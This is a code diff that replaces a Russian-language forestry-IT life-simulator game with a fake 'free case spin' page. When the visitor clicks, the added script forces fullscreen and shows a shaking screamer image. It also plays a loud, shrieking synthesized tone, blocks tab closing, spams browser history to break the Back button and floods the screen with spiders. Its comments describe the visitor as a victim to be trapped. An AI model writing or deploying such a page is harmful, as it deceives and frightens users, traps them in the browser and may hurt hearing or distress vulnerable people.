@@ -3,477 +3,237 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ЛЕСХОЗ-АСУП: СИМУЛЯТОР ЖИЗНИ v1.0 (Android TV)</title>
+    <title>Tom Case Simulator — Официальный сайт</title>
     <style>
-        :root {
-            --bg-dark: #050806;
-            --panel-bg: rgba(13, 22, 17, 0.95);
-            --border: #1e362a;
-            --primary: #10b981;
-            --text: #f1f5f9;
-            --warning: #f59e0b;
-            --danger: #ef4444;
-            --info: #06b6d4;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
-        
+        /* Стильный дефолтный сайт под симулятор кейсов */
         body {
-            background-color: var(--bg-dark);
-            color: var(--text);
-            width: 100vw;
-            height: 100vh;
-            overflow: hidden;
-            padding: 1.5vw;
-            display: flex;
-            flex-direction: column;
-            cursor: none; /* Скрываем курсор для ТВ */
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: #0e121b;
+            color: #eceff4;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
         }
-
-        /* Хедер с фазами дня */
         header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: var(--panel-bg);
-            border: 3px solid var(--border);
-            padding: 12px 30px;
-            border-radius: 10px;
-            margin-bottom: 1.5vh;
-        }
-
-        .time-badge {
-            font-size: 20px;
-            background: #0f172a;
-            padding: 5px 15px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-        }
-
-        /* Сетка интерфейса */
-        .grid-container {
-            display: grid;
-            grid-template-columns: 1fr 1.2fr;
-            gap: 1.5vw;
-            height: 80vh;
-        }
-
-        .panel {
-            background: var(--panel-bg);
-            border: 3px solid var(--border);
-            border-radius: 10px;
+            background-color: #1a2333;
             padding: 20px;
-            display: flex;
-            flex-direction: column;
+            border-bottom: 2px solid #2e3b54;
+            text-align: center;
         }
-
-        .panel-title {
-            color: var(--primary);
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 1.5vh;
-            border-bottom: 2px solid var(--border);
-            padding-bottom: 5px;
+        header h1 {
+            margin: 0;
+            color: #4c566a;
+            font-size: 24px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
         }
-
-        /* Жизненные показатели и показатели Лесхоза */
-        .stats-section {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1.5vh;
-            margin-bottom: 2vh;
+        header h1 span {
+            color: #88c0d0;
         }
-
-        .stat-box {
-            background: rgba(0,0,0,0.4);
-            border: 1px solid var(--border);
-            padding: 10px;
-            border-radius: 6px;
+        .main-container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: #1e2838;
+            padding: 40px;
+            border-radius: 12px;
+            border: 1px solid #2e3b54;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
         }
-
-        .stat-label { font-size: 13px; color: #94a3b8; margin-bottom: 4px; }
-        .stat-val { font-size: 20px; font-weight: bold; }
-
-        .bar-bg {
-            width: 100%; height: 8px; background: #0f172a; 
-            border-radius: 4px; margin-top: 6px; overflow: hidden;
-        }
-        .bar-fill { height: 100%; width: 100%; background: var(--primary); transition: width 0.3s ease; }
-
-        /* Финансы */
-        .finance-box {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: auto;
-            background: rgba(0,0,0,0.6);
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px dashed var(--border);
-        }
-
-        /* Логгер действий */
-        .log-box {
-            background: #020403;
-            border: 2px solid var(--border);
-            border-radius: 6px;
-            padding: 10px;
-            font-size: 14px;
-            height: 15vh;
-            overflow: hidden;
-            margin-top: 1.5vh;
+        .case-preview {
+            width: 200px;
+            height: 200px;
+            margin: 20px auto;
+            background: radial-gradient(circle, #3b4252 0%, #2e3440 100%);
+            border-radius: 10px;
+            border: 2px dashed #88c0d0;
             display: flex;
-            flex-direction: column;
-            gap: 4px;
+            justify-content: center;
+            align-items: center;
+            font-size: 80px;
+            box-shadow: 0 0 20px rgba(136, 192, 208, 0.2);
         }
-        .log-line { color: #64748b; }
-        .log-line.important { color: var(--warning); }
-        .log-line.danger { color: var(--danger); }
-
-        /* Экран выбора действий и ЧП */
-        .action-zone {
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            height: 100%;
-        }
-
-        .scenario-text {
-            font-size: 20px;
-            line-height: 1.5;
-            color: #f1f5f9;
-            background: rgba(0,0,0,0.2);
-            padding: 15px;
+        .btn-spin {
+            display: inline-block;
+            background: linear-gradient(90deg, #81a1c1, #88c0d0);
+            color: #2e3440;
+            padding: 18px 40px;
+            font-size: 18px;
+            text-decoration: none;
             border-radius: 8px;
-            border-left: 4px solid var(--primary);
-            margin-bottom: 2vh;
-            min-height: 12vh;
+            margin-top: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            text-transform: uppercase;
+            box-shadow: 0 5px 15px rgba(136, 192, 208, 0.4);
+            transition: transform 0.1s;
+        }
+        .btn-spin:active {
+            transform: scale(0.95);
         }
 
-        .menu-list { display: flex; flex-direction: column; gap: 1.2vh; }
-
-        /* ТВ-КНОПКИ С ФОКУСОМ */
-        .focusable {
-            background: rgba(18, 32, 24, 0.8);
-            border: 2px solid var(--border);
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 8px;
-            font-size: 16px;
-            text-align: left;
-            outline: none;
-            transition: all 0.15s ease;
-            display: flex;
-            justify-content: space-between;
+        /* КАТАСТРОФА (Изначально скрыта) */
+        .screamer-layer {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: black;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
             align-items: center;
         }
-
-        .focusable:focus {
-            background: var(--primary);
-            color: #000;
-            border-color: #fff;
-            box-shadow: 0 0 20px var(--primary-glow);
-            transform: scale(1.01);
-            font-weight: bold;
+        .screamer-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            animation: shake 0.05s infinite alternate;
         }
 
-        .focusable:disabled {
-            opacity: 0.25; background: #1e293b; color: #64748b; border-color: transparent;
+        /* Пауки */
+        .spider {
+            position: fixed;
+            width: 80px;
+            height: auto;
+            z-index: 10000;
+            pointer-events: none;
+            display: none;
+            user-select: none;
         }
 
-        .badge-cost {
-            font-size: 14px; padding: 2px 8px; border-radius: 4px; background: rgba(0,0,0,0.4); color: var(--warning);
+        @keyframes shake {
+            0% { transform: translate(3px, 2px) rotate(0deg); }
+            10% { transform: translate(-2px, -3px) rotate(-2deg); }
+            20% { transform: translate(-4px, 0px) rotate(2deg); }
+            30% { transform: translate(0px, 3px) rotate(0deg); }
+            40% { transform: translate(2px, -2px) rotate(2deg); }
+            50% { transform: translate(-2px, 3px) rotate(-2deg); }
+            60% { transform: translate(-4px, 2px) rotate(0deg); }
+            75% { transform: translate(3px, 2px) rotate(-4deg); }
+            90% { transform: translate(-2px, -2px) rotate(0deg); }
+            100% { transform: translate(2px, 3px) rotate(2deg); }
         }
-        .focusable:focus .badge-cost { background: #000; }
-
-        /* Оверлей конца игры */
-        .overlay {
-            position: fixed; top:0; left:0; width:100%; height:100%;
-            background: rgba(2, 5, 3, 0.98); z-index: 999;
-            display: flex; justify-content: center; align-items: center; visibility: hidden;
-        }
-        .overlay.active { visibility: visible; }
-        .modal { background: var(--panel-bg); border: 4px solid var(--primary); padding: 40px; border-radius: 15px; text-align: center; max-width: 700px; }
     </style>
 </head>
 <body>
 
     <header>
-        <h1 style="font-size: 24px;">🌲 ТАЙГА-ИНЖЕНЕР: СИМУЛЯТОР ЖИЗНИ</h1>
-        <div style="display: flex; gap: 15px;">
-            <div class="time-badge" id="display-day" style="color: var(--warning);">ДЕНЬ 1</div>
-            <div class="time-badge" id="display-phase" style="color: var(--info);">УТРО</div>
-        </div>
+        <h1>⚡ <span>TOM CASE</span> BETA UPDATE v2.6 ⚡</h1>
     </header>
-
-    <div class="grid-container">
+    
+    <div class="main-container">
+        <h2>Доступен Секретный Кейс от Тома!</h2>
+        <p style="color: #d8dee9; font-size: 15px;">Вы получили один бесплатный праздничный кейс. Нажмите на кнопку ниже, чтобы запустить прокрутку барабана и выбить лимитированный скин.</p>
         
-        <!-- ЛЕВАЯ ПАНЕЛЬ: СОСТОЯНИЕ ИГРОКА И ПРЕДПРИЯТИЯ -->
-        <div class="panel">
-            <div class="panel-title">🧠 ВАШИ ЖИЗНЕННЫЕ ПОКАЗАТЕЛИ</div>
-            <div class="stats-section">
-                <div class="stat-box">
-                    <div class="stat-label">🍗 Сытость</div>
-                    <div id="val-hunger" class="stat-val">100%</div>
-                    <div class="bar-bg"><div id="bar-hunger" class="bar-fill"></div></div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-label">⚡ Энергия</div>
-                    <div id="val-energy" class="stat-val">100%</div>
-                    <div class="bar-bg"><div id="bar-energy" class="bar-fill"></div></div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-label">❤️ Здоровье / Нервы</div>
-                    <div id="val-health" class="stat-val">100%</div>
-                    <div class="bar-bg"><div id="bar-health" class="bar-fill"></div></div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-label">🪵 ЕГАИС Лесхоза</div>
-                    <div id="val-egais" class="stat-val">70%</div>
-                    <div class="bar-bg"><div id="bar-egais" class="bar-fill"></div></div>
-                </div>
-            </div>
-
-            <div class="panel-title">📡 ТЕХНИЧЕСКИЙ СТАТУС СТРУКТУР</div>
-            <div class="stats-section" style="margin-bottom: 0;">
-                <div class="stat-box">
-                    <div class="stat-label">💻 ИТ-Инфраструктура</div>
-                    <div id="val-infra" class="stat-val">65%</div>
-                    <div class="bar-bg"><div id="bar-infra" class="bar-fill"></div></div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-label">🚜 Уважение работяг</div>
-                    <div id="val-staff" class="stat-val">60%</div>
-                    <div class="bar-bg"><div id="bar-staff" class="bar-fill"></div></div>
-                </div>
-            </div>
-
-            <div class="finance-box">
-                <div>
-                    <div class="stat-label">💵 Ваш кошелек (Личные)</div>
-                    <div style="font-size: 22px; font-weight:bold; color:#4ade80;"><span id="val-cash">5 000</span> ₽</div>
-                </div>
-                <div>
-                    <div class="stat-label">🏛 Бюджет АСУП (Завод)</div>
-                    <div style="font-size: 22px; font-weight:bold; color:var(--warning);"><span id="val-budget">80 000</span> ₽</div>
-                </div>
-            </div>
-
-            <div class="log-box" id="log-box">
-                <div class="log-line">• Рабочая смена началась. Пульт готов к навигации.</div>
-            </div>
-        </div>
-
-        <!-- ПРАВАЯ ПАНЕЛЬ: ДИНАМИЧЕСКИЕ ДЕЙСТВИЯ -->
-        <div class="panel">
-            <div class="action-zone">
-                <div class="panel-title" id="action-title">Сводка текущей фазы</div>
-                <div class="scenario-text" id="scenario-text">Загрузка данных...</div>
-                
-                <div class="menu-list" id="choices-box">
-                    <!-- Сюда JS рендерит кнопки -->
-                </div>
-            </div>
-        </div>
-
+        <div class="case-preview">📦</div>
+        
+        <button class="btn-spin" id="spinBtn">Крутить бесплатно</button>
     </div>
 
-    <!-- ОКНО КОНЦА ИГРЫ -->
-    <div id="game-overlay" class="overlay">
-        <div class="modal">
-            <h2 id="modal-title" style="font-size: 36px; color: var(--danger); margin-bottom: 20px;">КОНЕЦ ЖИЗНИ</h2>
-            <p id="modal-desc" style="font-size: 20px; line-height: 1.5; margin-bottom: 30px;">Описание смерти или увольнения.</p>
-            <button class="focusable" id="restart-btn" style="width: 100%; text-align: center;" onclick="location.reload()">ЗАГРУЗИТЬ СЛЕДУЮЩЕГО ИНЖЕНЕРА (ОК)</button>
-        </div>
+    <div class="screamer-layer" id="screamer">
+        <img class="screamer-image" src="https://i.imgur.com/H8M8H7P.jpg" alt="BOO!">
     </div>
 
     <script>
-        // Игровое состояние
-        const player = {
-            hunger: 100, energy: 100, health: 100,
-            egais: 70, infra: 65, staff: 60,
-            cash: 5000, budget: 80000,
-            day: 1, phaseIdx: 0
+        const spinBtn = document.getElementById('spinBtn');
+        const screamer = document.getElementById('screamer');
+
+        // Блокировка закрытия вкладки (покажет системное предупреждение)
+        window.onbeforeunload = function() {
+            return "НЕЛЬЗЯ ПРОСТО ТАК ВЗЯТЬ И УЙТИ!";
         };
 
-        const phases = ["УТРО", "ДЕНЬ", "ВЕЧЕР", "НОЧЬ (СОН)"];
-
-        // Пул случайных рабочих ЧП (Происходят Днем)
-        const workCrises = [
-            {
-                text: "🚨 ЛесЕГАИС заблокировал отгрузку дуба из-за ошибки в синхронизации шлюза. Водители лесовозов устроили забастовку у шлагбаума.",
-                options: [
-                    { text: "Купить коммерческий VPN-прокси для обхода лагов госсайта", cost: 12000, target: 'budget', run: () => { player.egais += 20; player.energy -= 20; log("Связь пробита. Логи пошли.", "important"); } },
-                    { text: "Послать всех лесом и заставить перебивать кубометры руками", cost: 0, target: 'none', run: () => { player.egais -= 25; player.staff -= 20; player.energy -= 30; log("На вас кричали матом. Система висит.", "danger"); } }
-                ]
-            },
-            {
-                text: "🔥 Молния ударила в сосну, на которой висел Wi-Fi мост до удаленной пилорамы. Связи нет.",
-                options: [
-                    { text: "Списать деньги на новое оборудование и вызвать монтажников", cost: 25000, target: 'budget', run: () => { player.infra += 30; log("Мост восстановлен.", "important"); } },
-                    { text: "Полезть на дерево самому со старым роутером и скотчем", cost: 0, target: 'none', run: () => { 
-                        player.energy -= 40;
-                        if(Math.random() > 0.4) { player.infra += 20; player.health -= 15; log("Вы упали с сука, но роутер прикрутили.", "important"); }
-                        else { player.health -= 40; player.infra -= 10; log("Вы сорвались с ветки! Сильный ушиб ребер.", "danger"); }
-                    }}
-                ]
-            },
-            {
-                text: "👵 Главбух Тамара Ивановна случайно удалила базу данных '1С:Зарплата и Кадры Лесхоза' за текущий квартал.",
-                options: [
-                    { text: "Достать бэкап из облака (Вы ведь настраивали его?)", cost: 5000, target: 'budget', run: () => { player.infra += 10; player.staff += 15; log("Резервная копия развернута успешно.", "important"); } },
-                    { text: "Вручную восстанавливать таблицы по логам транзакций SQL", cost: 0, target: 'none', run: () => { player.energy -= 50; player.sanity -= 20; player.staff += 10; log("Глаза дергаются, но базу спасли.", "important"); } }
-                ]
-            }
-        ];
-
-        function updateBars() {
-            const keys = ['hunger', 'energy', 'health', 'egais', 'infra', 'staff'];
-            keys.forEach(k => {
-                document.getElementById(`val-${k}`).innerText = player[k] + '%';
-                const bar = document.getElementById(`bar-${k}`);
-                bar.style.width = player[k] + '%';
-                bar.style.backgroundColor = player[k] < 30 ? 'var(--danger)' : (player[k] < 60 ? 'var(--warning)' : 'var(--primary)');
-            });
-            document.getElementById('val-cash').innerText = player.cash.toLocaleString('ru');
-            document.getElementById('val-budget').innerText = player.budget.toLocaleString('ru');
-            document.getElementById('display-day').innerText = `ДЕНЬ ${player.day}`;
-            document.getElementById('display-phase').innerText = phases[player.phaseIdx];
-        }
-
-        function log(msg, type = '') {
-            const box = document.getElementById('log-box');
-            const line = document.createElement('div');
-            line.className = `log-line ${type}`;
-            line.innerText = `• ${msg}`;
-            box.appendChild(line);
-            if(box.children.length > 4) box.removeChild(box.children[0]);
-        }
-
-        function generatePhase() {
-            if (checkGameOver()) return;
-
-            const title = document.getElementById('action-title');
-            const text = document.getElementById('scenario-text');
-            const container = document.getElementById('choices-box');
-            container.innerHTML = '';
-
-            let currentPhase = phases[player.phaseIdx];
-            title.innerText = `План действий: ${currentPhase}`;
-
-            // УТРЕННИЙ ВЫБОР (Быт и подготовка)
-            if (currentPhase === "УТРО") {
-                text.innerText = "Новое утро в лесхозе. Пахнет хвоей, сыростью и горелой проводкой. Нужно решить, как начать день.";
-                addOption("Плотный завтрак в столовой (-300₽ личных, +40% сытости)", 300, 'cash', () => { player.hunger = Math.min(100, player.hunger + 40); player.cash -= 300; log("Вы съели суп и три пирожка."); });
-                addOption("Выпить растворимый кофе 3-в-1 (+20% энергии, портит желудок)", 0, 'none', () => { player.energy = Math.min(100, player.energy + 20); player.hunger -= 10; player.health -= 5; log("Дешевый кофе взбодрил нервы."); });
-                addOption("Сразу побежать проверять логи серверов натощак (-10% сытости, +10% ИТ-стабильности)", 0, 'none', () => { player.hunger -= 15; player.infra = Math.min(100, player.infra + 10); log("Вы вовремя заметили сбой RAID-массива."); });
-            } 
-            // ДНЕВНОЙ ВЫБОР (Рабочие кризисы Тайги)
-            else if (currentPhase === "ДЕНЬ") {
-                const crisis = workCrises[Math.floor(Math.random() * workCrises.length)];
-                text.innerText = crisis.text;
-                crisis.options.forEach(o => {
-                    addOption(o.text + (o.cost > 0 ? ` (${o.cost}₽)` : ""), o.cost, o.target, o.run);
-                });
-            } 
-            // ВЕЧЕРНИЙ ВЫБОР (Личное время и подработки)
-            else if (currentPhase === "ВЕЧЕР") {
-                text.innerText = "Рабочий день окончен. Начальство уехало. У вас есть личное время до темноты.";
-                addOption("Взять калым: Настроить ноутбук местному лесничему (+2500₽ в кошелек, -30% энергии)", 0, 'none', () => { player.cash += 2500; player.energy -= 30; log("Почистили лесничему вирусы. Заработали денег."); });
-                addOption("Провести профилактику ИБП в серверной Лесхоза (-20% энергии, +20% ИТ-стабильности)", 0, 'none', () => { player.energy -= 20; player.infra = Math.min(100, player.infra + 20); log("Протерли пыль, подтянули контакты питания."); });
-                addOption("Отдохнуть на крыше, глядя на закат над тайгой (+20% здоровья/психики)", 0, 'none', () => { player.health = Math.min(100, player.health + 20); log("Красота природы вернула вам душевный покой."); });
-            } 
-            // НОЧНОЙ ВЫБОР (Сон или дежурство)
-            else if (currentPhase === "НОЧЬ (СОН)") {
-                text.innerText = "Глухая ночь. В лесу воют волки, в серверной воют кулеры. Пора восстанавливать силы.";
-                addOption("Лечь спать на топчане в каптерке (Полное восстановление энергии, ЕГАИС без контроля -10%)", 0, 'none', () => { player.energy = 100; player.egais -= 10; player.hunger -= 20; log("Отлично выспались под гул трансформатора."); });
-                addOption("Купить энергетик за свои деньги и дежурить всю ночь (-500₽, +15% ЕГАИС, -30% здоровья)", 500, 'cash', () => { player.cash -= 500; player.energy = 40; player.egais = Math.min(100, player.egais + 15); player.health -= 25; log("Тяжелая ночь бдения за мониторами."); });
+        spinBtn.addEventListener('click', () => {
+            // Врубаем фуллскрин, чтобы спрятать крестик и вкладки браузера
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
+                document.documentElement.webkitRequestFullscreen();
             }
 
-            // Автофокус на первую кнопку (самое важное для Android TV)
+            // Показываем скример
+            screamer.style.display = 'flex';
+
+            // ГЕНЕРАЦИЯ ЖЕСТКОГО СИНТЕТИЧЕСКОГО ШУМА И ПИСКА
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+
+                // 'sawtooth' (пила) — дает самый грязный, резкий и мерзкий звук
+                oscillator.type = 'sawtooth'; 
+                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // Начальная частота
+
+                // Выкручиваем громкость звукового узла страницы на максимум
+                gainNode.gain.setValueAtTime(2.5, audioCtx.currentTime); 
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+
+                oscillator.start();
+
+                // Каждые 40мс меняем частоту звука, создавая эффект визжащей и ломающейся сирены
+                setInterval(() => {
+                    oscillator.frequency.setValueAtTime(Math.random() * 1600 + 300, audioCtx.currentTime);
+                }, 40);
+
+            } catch (e) {
+                console.log("Браузер заблокировал звук:", e);
+            }
+
+            // Через 2.5 секунды убираем физиономию скримера, но оставляем ад на сайте
             setTimeout(() => {
-                const firstBtn = container.querySelector('.focusable:not(:disabled)');
-                if (firstBtn) firstBtn.focus();
-            }, 50);
+                screamer.style.display = 'none';
+                // Меняем текст сайта, чтобы добить жертву подколкой
+                document.querySelector('.main-container h2').innerText = "ОЙ! ЧТО-ТО ПОШЛО НЕ ТАК... 🕷️";
+                document.querySelector('.main-container p').innerText = "Кажется, Том закинул в кейс кое-что живое. И оно выбралось наружу. Кнопка выхода заблокирована.";
+                spinBtn.style.display = 'none';
+                
+                // Запускаем нашествие пауков
+                startSpiders();
+            }, 2500);
+        });
+
+        // Функция спавна ползающих пауков
+        function startSpiders() {
+            for (let i = 0; i < 20; i++) {
+                createSpider();
+            }
         }
 
-        function addOption(text, cost, target, callback) {
-            const container = document.getElementById('choices-box');
-            const btn = document.createElement('button');
-            btn.className = 'focusable';
-            
-            let badge = "";
-            if (cost > 0) {
-                badge = `<span class="badge-cost">${cost} ₽ (${target === 'cash' ? 'Личные' : 'ИТ'})</span>`;
-            }
-            btn.innerHTML = `<span>${text}</span> ${badge}`;
+        function createSpider() {
+            const spider = document.createElement('div');
+            spider.className = 'spider';
+            spider.style.display = 'block';
+            spider.style.fontSize = Math.random() * 50 + 30 + 'px'; // Разные размеры пауков
+            spider.innerText = '🕷️';
+            document.body.appendChild(spider);
 
-            // Проверка условий доступности средств
-            if (target === 'cash' && player.cash < cost) btn.disabled = true;
-            if (target === 'budget' && player.budget < cost) btn.disabled = true;
+            let x = Math.random() * window.innerWidth;
+            let y = Math.random() * window.innerHeight;
 
-            btn.onclick = () => {
-                callback();
-                nextPhase();
-            };
-            container.appendChild(btn);
+            spider.style.left = x + 'px';
+            spider.style.top = y + 'px';
+
+            // Хаотичное движение пауков
+            setInterval(() => {
+                x += (Math.random() - 0.5) * 70;
+                y += (Math.random() - 0.5) * 70;
+                
+                if (x < 0) x = window.innerWidth;
+                if (x > window.innerWidth) x = 0;
+                if (y < 0) y = window.innerHeight;
+                if (y > window.innerHeight) y = 0;
+
+                spider.style.left = x + 'px';
+                spider.style.top = y + 'px';
+            }, 80);
         }
 
-        function nextPhase() {
-            // Естественное истощение организма за каждую фазу
-            player.hunger = Math.max(0, player.hunger - 10);
-            if(player.phaseIdx !== 3) { // Ночью тратится по-другому
-                player.energy = Math.max(0, player.energy - 15);
-            }
-
-            // Штрафы за критическое состояние здоровья персонажа
-            if (player.hunger <= 0 || player.energy <= 0) {
-                player.health = Math.max(0, player.health - 20);
-                log("Вы истощены! Здоровье падает!", "danger");
-            }
-
-            player.phaseIdx++;
-            if (player.phaseIdx >= phases.length) {
-                player.phaseIdx = 0;
-                player.day++;
-                // Начисление суточных/зарплаты раз в день
-                player.cash += 3000;
-                log("Начался новый день. Получена часть зарплаты: +3000₽", "important");
-            }
-
-            updateBars();
-            generatePhase();
-        }
-
-        function checkGameOver() {
-            let gameOver = false;
-            let msg = "";
-
-            if (player.health <= 0) { msg = "💀 СМЕРТЬ: Ваше тело не выдержало диеты из дешевого кофе, падения с сосен и бессонных ночей. Лесхоз ищет нового инженера."; gameOver = true; }
-            else if (player.egais <= 0) { msg = "🏛 СУД: Госструктуры заблокировали Лесхоз за тонны неучтенной древесины. Директор свалил вину на АСУП. Вас везут на допрос."; gameOver = true; }
-            else if (player.infra <= 0) { msg = "⚡ ИТ-КРАХ: Серверная полностью сгорела вместе со шлюзами связи. Предприятие ослепло. Вы уволены без выплаты зарплаты."; gameOver = true; }
-            else if (player.staff <= 0) { msg = "🪓 РАСПРАВА: Работяги устали от сбоев ГЛОНАСС и невыплаты премий из-за 1С. Вам заколотили дверь снаружи и пустили дым."; gameOver = true; }
-            else if (player.day > 10) { msg = "🎉 ПОБЕДА! Вы прожили и удержали под контролем АСУП целых 10 дней! Вы доказали, что цифровой киберпанк возможен даже в глухой тайге."; gameOver = true; }
-
-            if (gameOver) {
-                const overlay = document.getElementById('game-overlay');
-                overlay.classList.add('active');
-                document.getElementById('modal-desc').innerText = msg;
-                if(player.day > 10) {
-                    document.getElementById('modal-title').innerText = "ЛЕГЕНДА ЛЕСХОЗА";
-                    document.getElementById('modal-title').style.color = "var(--primary)";
-                }
-                document.getElementById('restart-btn').focus();
-                return true;
-            }
-            return false;
-        }
-
-        // Первичный запуск
-        updateBars();
-        generatePhase();
+        // Спам истории (Ломает кнопку "Назад" в мобильных и ПК браузерах)
+        setInterval(() => {
+            window.history.pushState(null, "", window.location.href);
+        }, 400);
     </script>
 </body>
 </html>
